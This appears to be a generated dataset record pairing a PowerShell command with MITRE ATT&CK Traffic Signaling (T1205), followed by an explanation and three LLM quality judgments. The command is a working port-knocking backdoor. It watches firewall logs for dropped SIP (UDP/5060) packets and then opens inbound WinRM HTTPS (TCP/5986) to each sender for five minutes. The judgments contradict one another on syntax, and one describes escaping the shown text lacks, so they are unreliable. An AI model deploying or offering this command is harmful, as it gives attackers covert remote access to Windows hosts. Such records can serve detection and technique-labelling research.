command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\s+UDP\s+(\d{1,3}(?:\.\d{1,3}){3})\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+5060\b') { $src=$matches[1]; $name="sip-winrmhttps-$($src.Replace('.','-'))"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }
explanation: Uses unexpected SIP discovery traffic (UDP/5060) as a signal to enable WinRM over HTTPS (5986) for the sender IP.
rationale_steps: Monitor for inbound UDP/5060 packets to the host
Open a temporary TCP/5986 rule for the signaling IP

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quoting and valid parameters, though the Start-Job scriptblock is missing a statement separator after param($n) which may cause parsing issues on some versions.
llm_judgments.semantic_justification: The logic matches Traffic Signaling by using UDP/5060 drops as a trigger to temporarily open WinRM HTTPS to the source IP, but it unrealistically claims no privileges despite requiring administrative rights for firewall changes and assumes WinRM is preconfigured and accessible via Invoke-Command to localhost.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with balanced braces and proper pipeline usage, though the escaped backslashes in the regex pattern (e.g., 'DROP\s+UDP\s+') may behave differently than intended inside a double-quoted string passed through Invoke-Command, potentially causing regex matching issues at runtime.
llm_judgments.semantic_justification: The command precisely implements T1205 Traffic Signaling by monitoring Windows Firewall logs for dropped UDP/5060 (SIP) packets as a covert trigger signal, then dynamically creating a temporary inbound firewall rule to allow WinRM-HTTPS (TCP/5986) from the signaling source IP for 300 seconds, which is a textbook port-knocking/traffic-signaling C2 activation mechanism.

llm_judgments.syntactic_justification: The command is a well-formed PowerShell script block using valid cmdlet syntax, proper piping, and balanced delimiters.
llm_judgments.semantic_justification: The command perfectly illustrates Traffic Signaling (T1205) by monitoring firewall logs for a specific 'knock' (UDP 5060) to open a backdoor (WinRM 5986); however, it requires Administrator privileges (contradicting the 'None' metadata) and the regex contains unnecessary double-escaped backslashes which would cause it to fail to match standard log entries.
